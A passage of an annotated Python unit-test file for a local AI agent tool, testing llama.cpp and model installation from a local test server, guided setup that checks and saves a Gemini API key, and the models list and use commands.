154 |             bundle.writestr("llama-server.exe", b"MZ fake program")
155 |         data = payload.getvalue()
156 |         server = RangeServer(data)
157 |         self.addCleanup(server.close)
158 |         with tempfile.TemporaryDirectory() as tmp, \
159 |                 mock.patch.object(models, "HOME", Path(tmp)), \
160 |                 mock.patch.object(models, "find_llama_release",
161 |                                   return_value=("llama-b9-bin-win-cpu-x64.zip", server.url, len(data),
162 |                                                 hashlib.sha256(data).hexdigest())):
163 |             folder = models.install_llama(lambda _d, _t: None)
164 |             self.assertEqual(folder, Path(tmp) / "llama" / "llama-b9-bin-win-cpu-x64")
165 |             self.assertTrue((folder / "llama-server.exe").is_file())
166 |             self.assertEqual(list((Path(tmp) / "llama" / "downloads").iterdir()), [])   # zip deleted
167 | 
```
```python
168 |     def test_a_model_goes_to_the_models_folder(self):
169 |         with tempfile.TemporaryDirectory() as tmp, mock.patch.object(models, "HOME", Path(tmp)), \
170 |                 mock.patch.object(models, "download", return_value=Path("x")) as fetched:
171 |             model = models.CATALOG[1]
172 |             models.install_model(model, lambda _d, _t: None)
173 |             url, target, sha, size, _progress = fetched.call_args.args
174 |             self.assertEqual((url, target, sha, size),
175 |                              (model.url, Path(tmp) / "models" / model.file, model.sha256, model.size))
176 | 
177 | 
```
- A zip holding a fake `llama-server.exe`, served locally, is downloaded, verified, unpacked into its build folder,
  and its archive deleted.
- A model download is asked for with the catalog's address, checksum and size, into the models folder.

## Setup and the models command
```python
178 | class SetupTests(unittest.TestCase):
```
```python
179 |     def run_setup(self, tmp, key="", given_key="", key_state="ok", llama=None, model=None,
180 |                   answers=("y", "y")):
181 |         said: list[str] = []
182 |         replies = iter(answers)
183 |         settings = Path(tmp) / "settings.json"
184 |         with mock.patch.dict(os.environ, {}, clear=False), \
185 |                 mock.patch.object(models, "check_gemini_key", return_value=key_state), \
186 |                 mock.patch.object(models, "find_llama_server", side_effect=[llama, llama or Path("l")]), \
187 |                 mock.patch.object(models, "find_model_file", return_value=model), \
188 |                 mock.patch.object(models, "install_llama", return_value=Path(tmp) / "llama"), \
189 |                 mock.patch.object(models, "install_model", return_value=Path(tmp) / "m.gguf"), \
190 |                 mock.patch.object(models, "docker_available", return_value=False):
191 |             code = models.run_setup(replace(Config(), gemini_api_key=key), ask=lambda _q: next(replies),
192 |                                     secret=lambda _q: given_key, say=said.append,
193 |                                     settings_file=settings, progress=lambda _d, _t: None)
194 |             saved = json.loads(settings.read_text(encoding="utf-8")) if settings.exists() else {}
195 |         return code, "\n".join(said), saved
196 | 
```
- Runs `run_setup` with the key check, the finders, the installers and Docker replaced, typed answers from a list, a
  pasted key, and a settings file in a temporary folder; returns the exit code, everything said, and what was saved.

```python
197 |     def test_a_pasted_key_is_checked_and_saved(self):
198 |         with tempfile.TemporaryDirectory() as tmp:
199 |             code, said, saved = self.run_setup(tmp, given_key="good-key", llama=Path("l"),
200 |                                                model=Path("m.gguf"))
201 |             self.assertEqual(code, 0)
202 |             self.assertEqual(saved["env"]["GEMINI_API_KEY"], "good-key")
203 |             self.assertIn("Ready, online and offline", said)
204 | 
```
```python
205 |     def test_a_rejected_key_is_not_saved_and_missing_parts_are_offered(self):
206 |         with tempfile.TemporaryDirectory() as tmp:
207 |             code, said, saved = self.run_setup(tmp, given_key="bad", key_state="rejected")
208 |             self.assertEqual(saved, {})
209 |             self.assertIn("Google rejected that key", said)
210 |             self.assertIn("llama.cpp installed in", said)                  # offered and fetched
211 |             self.assertIn("model saved", said)
212 |             self.assertEqual(code, 0)                                      # offline is ready
213 | 
```
```python
214 |     def test_declining_everything_leaves_no_model(self):
215 |         with tempfile.TemporaryDirectory() as tmp:
216 |             code, said, _ = self.run_setup(tmp, answers=("n", "n"))
217 |             self.assertEqual(code, 1)
218 |             self.assertIn("No model is ready yet", said)
219 |             self.assertIn("skipped: without a key", said)
220 | 
```
- A good pasted key is saved under `env`, and with llama.cpp and a model present the result is "Ready, online and
  offline".
- A rejected key is not saved; the missing llama.cpp and model are offered and installed; offline alone counts as ready.
- Skipping the key and declining both downloads ends with "No model is ready yet" and exit code 1.

```python
221 |     def test_models_list_and_use(self):
222 |         with tempfile.TemporaryDirectory() as tmp:
223 |             home = Path(tmp)
224 |             (home / "models").mkdir()
225 |             gguf = home / "models" / "Qwen3-4B-Q4_K_M.gguf"
226 |             gguf.write_bytes(b"GGUF")
227 |             settings = home / "settings.json"
228 |             said: list[str] = []
229 |             with mock.patch.object(models, "HOME", home), \
230 |                     mock.patch.object(models, "CHECKOUT", home / "none"), \
231 |                     mock.patch.object(models, "find_model_file", return_value=gguf), \
232 |                     mock.patch.dict(os.environ, {"LOCALAGENT_MODEL_FILE": ""}):
233 |                 self.assertEqual(models.run_models([], Config(), said.append, settings), 0)
234 |                 self.assertTrue(any(line.startswith("  * ") and "Qwen3-4B" in line for line in said))
235 |                 self.assertEqual(models.run_models(["use", "qwen3-4b"], Config(), said.append, settings), 0)
236 |                 self.assertEqual(json.loads(settings.read_text(encoding="utf-8"))["env"]
237 |                                  ["LOCALAGENT_MODEL_FILE"], str(gguf.resolve()))
238 |                 self.assertEqual(models.run_models(["use", "qwen3-8b"], Config(), said.append, settings), 2)
239 |                 self.assertEqual(models.run_models(["download", "nope"], Config(), said.append, settings), 2)
240 |                 self.assertEqual(models.run_models(["frobnicate"], Config(), said.append, settings), 2)
241 | 
```
```python
242 |     def test_saving_a_setting_keeps_the_others(self):
243 |         with tempfile.TemporaryDirectory() as tmp:
244 |             path = Path(tmp) / "settings.json"
245 |             path.write_text('{"permissions": {"allow": ["run_tests"]}}', encoding="utf-8")
246 |             save_user_env("A", "1", path)
247 |             save_user_env("B", "2", path)
248 |             data = json.loads(path.read_text(encoding="utf-8"))
249 |             self.assertEqual(data, {"permissions": {"allow": ["run_tests"]}, "env": {"A": "1", "B": "2"}})
250 | 
```
```python
251 |     def test_the_commands_are_reached_from_the_command_line(self):
252 |         with mock.patch.object(cli, "run_models", return_value=0) as listed, \
253 |                 mock.patch.object(cli, "run_setup", return_value=0) as guided:
254 |             self.assertEqual(cli.main(["models", "use", "qwen3-4b"]), 0)
255 |             self.assertEqual(listed.call_args.args[0], ["use", "qwen3-4b"])
256 |             self.assertEqual(cli.main(["setup"]), 0)
257 |             self.assertTrue(guided.called)
258 |         with contextlib.redirect_stdout(io.StringIO()) as out, self.assertRaises(SystemExit):
259 |             cli.main(["--help"])
260 |         self.assertIn("localagent setup", out.getvalue())
261 | 
262 | 
```
- The list marks the model in use with `*`; `use qwen3-4b` saves its full path; a model that is not there, an unknown
  download and an unknown action each return 2.
- Saving two variables keeps the permission rules already in the file.
- `localagent models use qwen3-4b` and `localagent setup` reach their functions; `--help` names the commands.

```python
263 | if __name__ == "__main__":
264 |     unittest.main()
```
- Lets you run the file directly.
